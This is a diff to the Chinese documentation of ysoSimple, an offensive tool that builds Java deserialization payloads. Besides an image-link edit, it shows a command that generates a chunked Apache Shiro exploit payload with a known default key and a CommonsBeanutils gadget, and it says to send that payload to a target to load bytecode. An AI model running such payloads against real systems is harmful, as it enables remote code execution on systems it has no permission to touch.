@@ -1464,9 +1464,7 @@ java -cp ysoSimple.jar cn.butler.yso.exploit.ShiroChunkPayload [-g <gadget>] [-m
 java -cp ysoSimple.jar cn.butler.yso.exploit.ShiroChunkPayload -g CommonsBeanutils2 -m CBC -k kPH+bIxk5D2deZiIxcaaaA== -f /tmp/HTMLUtil.class -o /tmp/ShiroChunk.txt
 ```
 
-使用上述命令后的工具生成的最终效果：
-
-![image-20250105135921094](ysoSimple-Wiki.assets/image-20250105135921094.png)
+使用上述命令后的工具生成的最终效果：![image-20250105141522481](images/image-20250105141522481.png)
 
 然后将 /tmp/ShiroChunk.txt 放入Yakit进行发包，在目标系统中的系统属性中写入字节码
 
